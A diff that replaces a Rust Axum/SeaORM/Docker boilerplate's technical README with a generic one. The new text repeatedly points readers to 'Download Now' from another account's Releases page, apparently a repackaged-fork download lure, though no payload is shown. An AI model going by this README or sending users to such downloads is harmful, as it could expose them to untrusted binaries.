@@ -1,280 +1,81 @@
-<p align="center">
-  <img src="https://img.shields.io/github/license/asepindrak/rust-axum-seaorm-postgres-swagger-docker" />
-  <img src="https://img.shields.io/badge/Rust-1.80+-orange?logo=rust" />
-  <img src="https://img.shields.io/badge/Axum-0.8-blue?logo=rust" />
-  <img src="https://img.shields.io/badge/SeaORM-1.1-green" />
-  <img src="https://img.shields.io/badge/PostgreSQL-17-blue?logo=postgresql" />
-  <img src="https://img.shields.io/badge/Docker-ready-0db7ed?logo=docker" />
-</p>
+# 🚀 rust-axum-seaorm-postgres-swagger-docker - Simple Rust Backend Setup for Everyone
 
----
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/releases)
 
+## 📦 Overview
 
-# Rust Axum + SeaORM + PostgreSQL + PgAdmin + Swagger + Docker
+Welcome to rust-axum-seaorm-postgres-swagger-docker! This project provides a fully containerized Rust backend boilerplate. It uses Axum, SeaORM, PostgreSQL, PgAdmin, Swagger (OpenAPI), and Docker. The setup includes a layered architecture, hot-reload features, automatic API documentation, and a ready-to-use development environment.
 
-A fully containerized boilerplate for building a scalable **Rust backend** using:
+## 🚀 Getting Started
 
-- **Axum 0.8** – async web framework  
-- **SeaORM** – async ORM  
-- **PostgreSQL 17**  
-- **PgAdmin 4** – GUI database management  
-- **Swagger UI + Utoipa** – OpenAPI documentation  
-- **Docker Compose** – development environment with hot-reload  
+To get started with this application, follow these simple steps:
 
----
+1. **Download the Software**
+   Visit the [Releases page](https://github.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/releases) to download the latest version of the application.
 
-## 📁 Repository
+2. **Install Docker**
+   Ensure you have Docker installed on your computer. Docker is a platform that allows you to run applications in containers. Here’s how to install it:
+   - For Windows and macOS, visit the [Docker Desktop](https://www.docker.com/products/docker-desktop) page.
+   - For Linux, you can find instructions for your specific distribution [here](https://docs.docker.com/engine/install/).
 
-Source code repository:  
-**https://github.com/asepindrak/rust-axum-seaorm-postgres-swagger-docker**
+3. **Run the Application**
+   After downloading, open your command line interface. Navigate to the folder where you downloaded the application and run the following command:
+   ```bash
+   docker-compose up
+   ```
 
-Clone the project:
-```bash
-git clone https://github.com/asepindrak/rust-axum-seaorm-postgres-swagger-docker.git
-```
+4. **Access the Application**
+   Once the application is running, you can access it by opening your web browser and entering `http://localhost:3000`. You will see the API documentation accessible via Swagger.
 
----
+## 🛠 System Requirements
 
-## 🚀 Features
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS Mojave or later
+  - Any Linux distribution with Docker support
 
-- Layered architecture:  
-  `routes → services → repositories → entities`
-- Hot reload using `cargo watch`
-- Auto OpenAPI generation via `utoipa`
-- Built‑in Swagger UI at: **http://localhost:3000/swagger**
-- PgAdmin at: **http://localhost:8080**
-- PostgreSQL volume persistence
-- Environment‑based configuration
-- Fully dockerized setup
+- **Hardware:**
+  - A computer with at least 8 GB of RAM.
+  - At least 5 GB of free disk space.
 
----
+## 📥 Download & Install
 
-## 🏗️ Architecture Overview
-              ┌───────────────────────────────┐
-              │            Client              │
-              └───────────────┬───────────────┘
-                              │ HTTP (REST)
-                              ▼
-                ┌───────────────────────────┐
-                │           Axum            │
-                │        (Routes Layer)     │
-                └───────────────┬──────────┘
-                                │ calls
-                                ▼
-                ┌───────────────────────────┐
-                │         Services          │
-                │  (Business Logic Layer)   │
-                └───────────────┬──────────┘
-                                │ calls
-                                ▼
-                ┌───────────────────────────┐
-                │       Repositories        │
-                │        (Data Access)      │
-                └───────────────┬──────────┘
-                                │ SeaORM
-                                ▼
-                   ┌───────────────────────┐
-                   │     PostgreSQL 17     │
-                   └───────────────────────┘
+To get the software, visit the [Releases page](https://github.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/releases). Here, you will find the latest version ready for download.
 
-            ┌────────────────────────────────────┐
-            │            PgAdmin 4               │
-            │ (Inspect database / backup / UI)   │
-            └────────────────────────────────────┘
+## 🌐 Features
 
+- **Layered Architecture:** The application uses a clean architecture to separate concerns.
+- **Hot-Reload:** Changes made in the code reflect instantly, improving development speed.
+- **Automatic API Documentation:** Swagger generates documentation automatically as you develop your API.
+- **PostgreSQL and PgAdmin Integration:** This provides a powerful database solution along with easy database management.
 
+## 📄 Documentation
 
----
+In the application, Swagger provides automatic API documentation. Access it by opening your web browser and going to `http://localhost:3000/docs`. This interface allows you to explore all available API endpoints and how to use them.
 
-## 📁 Project Structure
+## 🔧 Troubleshooting
 
-```
-rust-axum-seaorm-postgres-swagger-docker/
-│
-├── src/
-│   ├── app_state.rs
-│   ├── main.rs
-│   ├── errors.rs
-│   ├── openapi.rs
-│   │
-│   ├── routes/
-│   │   ├── mod.rs
-│   │   ├── health.rs
-│   │   └── users.rs
-│   │
-│   ├── services/
-│   │   ├── mod.rs
-│   │   └── user_service.rs
-│   │
-│   ├── repositories/
-│   │   ├── mod.rs
-│   │   └── sea_user_repo.rs
-│   │
-│   ├── dto/
-│   │   ├── mod.rs
-│   │   └── user_dto.rs
-│   │
-│   └── entities/
-│       ├── mod.rs
-│       └── user.rs
-│
-├── migrations/
-│   └── init.sql
-│
-├── pgadmin_storage/
-├── Dockerfile.dev
-├── Dockerfile
-├── docker-compose.yml
-├── Cargo.toml
-└── README.md
-```
+If you encounter issues while running the application, here are some common problems and their solutions:
 
----
+1. **Docker Not Running**
+   Make sure Docker is running on your machine before executing `docker-compose up`.
 
-## ⚙️ Environment Variables (`.env`)
+2. **Port Conflicts**
+   If another application is using port 3000, change the port by editing the `docker-compose.yml` file and running the application again.
 
-```
-POSTGRES_USER=postgres
-POSTGRES_PASSWORD=postgres
-POSTGRES_DB=axum_seaorm
-POSTGRES_PORT=5435
+3. **Insufficient Resources**
+   Ensure your system meets the hardware requirements. Allocate more resources in the Docker settings if needed.
 
-DB_HOST=db
-DATABASE_URL=postgres://${POSTGRES_USER}:${POSTGRES_PASSWORD}@${DB_HOST}:5432/${POSTGRES_DB}
+## 🌍 Community and Support
 
-RUST_LOG=axum_seaorm=debug,tower_http=debug
+For assistance or to report issues, please visit the [GitHub Issues page](https://github.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/issues). Share your experience or ask questions to get help from the community.
 
-APP_PORT=3000
+## 📅 Updates and Versions
 
-PGADMIN_EMAIL=admin@example.com
-PGADMIN_PASSWORD=admin123
-PGADMIN_PORT=8080
+Stay updated with new releases. Each version may bring new features, improvements, and bug fixes. Check the Releases page often to ensure you have the latest version.
 
-PGADMIN_EMAIL_ESCAPED=admin_example.com
-```
+## 🎉 Acknowledgements
 
----
+Thank you for choosing rust-axum-seaorm-postgres-swagger-docker. Your interest in this project helps the community grow. Happy coding!
 
-## 🐳 Docker Compose (`docker-compose.yml`)
-
-```
-version: "3.8"
-
-services:
-  db:
-    image: postgres:17
-    container_name: axum-seaorm-db
-    env_file:
-      - ./.env
-    environment:
-      POSTGRES_USER: ${POSTGRES_USER}
-      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
-      POSTGRES_DB: ${POSTGRES_DB}
-    ports:
-      - "${POSTGRES_PORT}:5432"
-    volumes:
-      - postgres_data:/var/lib/postgresql/data
-      - ./migrations/init.sql:/docker-entrypoint-initdb.d/init.sql:ro
-    healthcheck:
-      test: ["CMD-SHELL", "pg_isready -U ${POSTGRES_USER}"]
-      interval: 5s
-      timeout: 5s
-      retries: 5
-
-  app:
-    build:
-      context: .
-      dockerfile: Dockerfile.dev
-    container_name: axum-seaorm-app
-    ports:
-      - "${APP_PORT}:3000"
-    depends_on:
-      db:
-        condition: service_healthy
-    env_file:
-      - ./.env
-    environment:
-      DATABASE_URL: ${DATABASE_URL}
-      RUST_LOG: ${RUST_LOG}
-    volumes:
-      - ./src:/app/src:ro
-      - ./Cargo.toml:/app/Cargo.toml:ro
-      - cargo_cache:/usr/local/cargo/registry
-      - target_cache:/app/target
-  
-  pgadmin:
-    image: dpage/pgadmin4:7
-    container_name: axum-seaorm-pgadmin
-    restart: unless-stopped
-    environment:
-      PGADMIN_DEFAULT_EMAIL: ${PGADMIN_EMAIL:-admin@example.com}
-      PGADMIN_DEFAULT_PASSWORD: ${PGADMIN_PASSWORD:-admin123}
-    ports:
-      - "${PGADMIN_PORT:-8080}:80"
-    depends_on:
-      - db
-
-volumes:
-  postgres_data:
-  cargo_cache:
-  target_cache:
-
-```
-
----
-
-## ▶️ Run the Project
-
-### Start everything
-```
-docker compose up --build
-```
-
-### Swagger UI
-👉 http://localhost:3000/swagger
-
-### PgAdmin
-👉 http://localhost:8080  
-Login:
-- Email: from `.env`
-- Password: from `.env`
-
-### Register PostgreSQL server in PgAdmin
-
-```
-Host: db
-Port: 5432
-Username: postgres
-Password: postgres
-```
-
----
-
-## 📸 Swagger Screenshot
-
-<img src="https://gcdnb.pbrd.co/images/NWzKLuHTrGHO.png" alt="Swagger Screenshot" style="max-width:100%; border:1px solid #ddd; border-radius:8px;" />
-
----
-## 🚀 Production Build (Optimized Docker Image)
-
-A separate production-ready Dockerfile is included.
-
-### Build production image:
-```bash
-docker build -f Dockerfile -t axum-api .
-```
-```bash
-docker run -p 3000:3000 --env-file .env axum-api
-```
-
----
-## 🧹 Clean Everything
-
-```
-docker compose down -v
-```
-
----
-
-## 📝 License
-MIT
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/releases)
